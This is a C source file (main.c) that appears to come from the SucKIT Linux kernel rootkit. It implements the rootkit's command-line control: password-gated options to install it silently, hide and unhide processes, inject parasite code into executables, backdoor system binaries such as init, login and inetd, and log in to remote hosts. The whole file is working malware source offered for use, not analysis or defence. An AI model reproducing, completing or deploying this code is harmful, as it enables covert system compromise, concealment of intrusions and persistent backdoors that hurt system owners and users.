/*
 * $Id: main.c, the main() sk stuff
 */

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/utsname.h>
#include <sys/mman.h>
#include <sys/socket.h>

#include "sk.h"
#include "aux.h"
#include "config.h"
#include "install.h"
#include "sha1.h"
#include "login.h"
#include "kernel.h"
#include "getpw.h"
#include "infect.h"
#include "skd.h"
#include "ident.h"

#define	AUTH_NONE	0
#define	AUTH_GLOBAL	1
#define	AUTH_LOCAL	2
#define A_NOLIMIT	(unsigned) 0x80000000

typedef	struct {
	char	opt;	/* option character */
	uint	args;	/* number of requiered args, 0 = none */
	uint	optargs;/* max. number of optional args, -1 = unlimited */
	int	(*handler)(int, char **); /* handler */
	int	auth;
	char	*syntax;
	char	*desc;
} opt;

static	char *argv0;

static void	auth_global()
{
	if (!authenticated()) {
		if (sk_auth(getpassw(SKPROMPT))) {
			eprintf("Go away with that, poor boy!\n");
			exit(1);
		}
	}
	eprintf("%s", BANNER);
	eprintf("Kernel side version: %s\n", authenticated());
}

static	void	auth_local()
{
	if (!authenticated()) {
		char	*p;
		uchar	h[20];
		p = getpassw(SKPROMPT);
		sha1_asm(h, p, strlen(p));
		if (memcmp(cfg.hashpass, h, 20)) {
			eprintf("Go away with that, poor boy!\n");
			exit(1);
		}
		eprintf("%s", BANNER);
		sk_auth(p);
	}
}

static	int	do_uninstall(int argc, char *argv[])
{
	return uninstall();
}

static	int	do_install(int argc, char *argv[])
{
	return install();
}

extern	int isilent;

static	int	do_install_silent(int argc, char *argv[])
{
	int	fd;

	isilent = 1;

	fd = socket(AF_UNIX, SOCK_STREAM, 0);
	dup2(fd, 0);
	dup2(fd, 1);
	dup2(fd, 2);
	
	return install();
}

static	int do_hide_pid(int argc, char **argv)
{
	int	pid;

	if (sscanf(argv[0], "%u", &pid) != 1) {
		eprintf("Invalid pid '%d'\n", pid);
		return 1;
	}
	return hide_pid(pid);
}

static	int do_unhide_pid(int argc, char **argv)
{
	int	pid;

	if (sscanf(argv[0], "%u", &pid) != 1) {
		eprintf("Invalid pid '%d'\n", pid);
		return 1;
	}
	return unhide_pid(pid);
}

static	int do_client_login(int argc, char **argv)
{
	char	*cmd = NULL;
	if (argc > 1) {
		int len, i;
		for (len = i = 1; i < argc; i++)
			len += strlen(argv[i]) + 2;
		cmd = malloc(len + 32);
		if (!cmd) {
			perror("malloc");
			return 1;
		}
		for (*cmd = 0, i = 1; i < argc; i++) {
			strcat(cmd, argv[i]);
			strcat(cmd, " ");
		}
	}
	return client_login(argv[0], cmd);
}

/*static	int is_file(char *s)
{
	return !strchr(s, ':');
}*/


static	int	do_config(int argc, char **argv)
{
	return configure(argv0, &cfg);
}


static	int	do_copy_suckit(void)
{
	char	skpath[512];
	int	i, j, size;
	char	*p;

	eprintf("Creating %s directory structure...", cfg.home);
	if (skd_dirs()) {
		perror("failed");
		return 1;
	}
	sprintf(skpath, "%s/sk", cfg.home);
	eprintf("Done\nCopying %s to %s...", argv0, skpath);
	i = open(argv0, O_RDONLY);
	if (i < 0) {
		perror(argv0);
		return 1;
	}
	j = creat(skpath, 0700);
	if (j < 0) {
		perror(skpath);
		close(i);
		return 1;
	}
	size = lseek(i, 0, SEEK_END);
	if (i < 0) {
		perror("lseek");
		close(i); close(j);
		return 1;
	}
	p = mmap(NULL, (size + 4095) & ~4095, PROT_READ, MAP_SHARED, i, 0);
	if (p == MAP_FAILED) {
		perror("mmap");
		close(i); close(j);
		return 1;
	}
	if (write(j, p, size) != size) {
		eprintf("write to %s failed\n", skpath);
		close(i); close(j);
		return 1;
	}
	munmap(p, (size + 4095) & ~4095);
	close(i); close(j);
	eprintf("Done\n");
	return 0;
}

static	int	do_backdoor_binary(int argc, char **argv)
{
	char	buf[512];
	
	do_copy_suckit();
	sprintf(buf, "%s/sk", cfg.home);
	return infect_binary(argv[0], buf);
}

static	int	do_suckit_box(int argc, char **argv)
{
	static	char *binlist[] =
		{
		  "init",
		  "getty",
		  "mingetty",
		  "fsck",
		  "mount",
		  "login",
		  "inetd",
		  NULL };
	static	char *dirlist[] =
#if 0
		{ "/bin",
		  "/sbin",
		  "/usr/bin",
		  "/usr/sbin",
		  "/usr/local/bin",
		  "/usr/local/sbin",
		  "/root/bin",
		  "/home/root/bin",
#else
		{ "/test",
#endif
		  NULL };

	char	skpath[512];
	char	buf[512];
	int	i, j;
	struct	stat st;
	static	int infected = 0;

	sprintf(skpath, "%s/sk", cfg.home);
	eprintf("Backdooring binaries\n");

	for (i = 0; dirlist[i]; i++)
	for (j = 0; binlist[j]; j++) {
		sprintf(buf, "%s/%s", dirlist[i], binlist[j]);
		if ((!stat(buf, &st)) && (st.st_mode & 0100)) {
			if (!infect_binary(buf, skpath))
				infected++;
		}
	}
	if (!infected) {
		eprintf("WARNING: no binary backdoored\n");
	}
	eprintf("Done, %d binaries backdoored\n", infected);
	return install();
}

/* option table */
static opt	opts[] = {
	{ 'C', 0, 0, do_config, AUTH_LOCAL,
		NULL,
		"configure"
	},
	{ 'u', 0, 0, do_uninstall, AUTH_GLOBAL,
		NULL,
		"uninstall"
	},
	{ 'i',	0, 0, do_install, AUTH_LOCAL,
		NULL,
		"install"
	},
	{ 's',	0, 0, do_install_silent, AUTH_NONE,
		NULL,
		"install silently"
	},
	{ 'x', 0, 0, do_suckit_box, AUTH_LOCAL,
		NULL,
		"make current box suckit-ed"
	},
	{ 'h',	1, 0, do_hide_pid, AUTH_GLOBAL,
		"<pid>",
		"make pid invisible"
	},
	{ 'v', 1, 0, do_unhide_pid, AUTH_GLOBAL,
		"<pid>",
		"make pid visible"
	},
	{ 'b', 1, 0, do_backdoor_binary, AUTH_LOCAL,
		"<filename>",
		"insert parasite code"
	},
	{ 'l', 1, A_NOLIMIT, do_client_login, AUTH_LOCAL,
		"<host[:port]>",
		"login to remote host"
	},
/*	{ 'p', 3, 0, do_upload, AUTH_LOCAL,
		 "<host> <local1> [localX] <rem>",
		 "upload file(s)"
	},
	{ 'd', 3, 0, do_download, AUTH_LOCAL,
		 "<host> <rem1> [remX] <local>",
		 "download file(s)"
	}, */
	{ 0 }
}; 

#define	slen(x) ((!x) ? 1 : strlen(x))

/* print all options + brief description */
static int	usage(char *s)
{
	opt	*o;
	int	max, i;
	char	buf[512];
	char	*p = buf;

	auth_local();
	*p = 0;
	for (o = opts, max = 0; o->opt; o++) {
		if ((i = slen(o->syntax)) > max)
			max = i;
		*p++ = o->opt;
		*p++ = '|';
	}
	*p = 0;

	eprintf("use: %s [%s] <arg1> [argN]\n", s, buf);

	memset(buf, '.', sizeof(buf));

	for (o = opts; o->opt; o++)
		eprintf("%c %s%.*s%s\n", o->opt, o->syntax ? o->syntax : ".",
			(int) (2+max-slen(o->syntax)), buf, o->desc);
	eprintf(
	"\nin <> is requiered options, [] are optional\n"
	"see doc/MANUAL for commands reference\n");
	return 1;
}

static int	check_kernel_version(void)
{
	struct	utsname n;

	if (uname(&n)) {
		auth_local();
		eprintf("Kernel check error: uname() failed");
		return 1;
	}
	
	/* must be at least 2.2.x */
	if ((n.release[0] < '2') ||
	    (n.release[0] == '2' && n.release[2] < '2')) {
	    	auth_local();
	    	eprintf("Kernel check error: %s not supported. (yet ?)\n",
			n.release);
		return 1;
	}
	return 0;
}

static	int sk_config(char *n)
{
	switch (load_config(n, &cfg)) {
		case 0:
			return 0;
		case -1:
			cfg.hidestr[0] = cfg.home[0] = 0;
			exit(configure(n, &cfg));
	}
	return 1;
}

/* analyze args and take the proper action */
int main(int argc, char *argv[], char *envp[])
{
	opt	*o;
	char	c;

	if (!argc) return 0;
	argv0 = argv[0];
	if (argc == 2) {
		if (!strcmp(argv[1], "reloctest")) {
			printf("%d\n", reloctest((void *) kernel_start,
						 (void *) kernel_end));
			return 0;
		}
		if (!strcmp(argv[1], "showident")) {
			printf("ident for this copy is: %s\n", IDENT);
			return 0;
		}
	}

	setbuf(stdout, NULL);
	setbuf(stderr, NULL);

	if (sk_config(argv[0]))
		return 1;

	if (check_kernel_version())
		return 1;

/*	l = strlen(argv[0]);
	if ((l >= strlen(cfg.hidestr)) &&
	    (!strcmp((argv[0] + l - strlen(cfg.hidestr)), cfg.hidestr)))
	   	return do_install_silent(0, NULL); */

	if (argc <= 1)
		return usage(argv[0]);

	if (strlen(argv[1]) != 1)
		return usage(argv[0]);
	c = argv[1][0];
	for (o = opts; o->opt; o++) 
		if ((c == o->opt) &&
		    ((argc - 2) <= (o->args + o->optargs)) &&
		    ((argc - 2) >= (o->args))) {
		    	switch (o->auth) {
				case AUTH_GLOBAL:
					auth_global();
					break;
				case AUTH_LOCAL:
					auth_local();
					break;
				default:;
			}
		    	return o->handler(argc - 2, &argv[2]);
		}
	return usage(argv[0]);
}
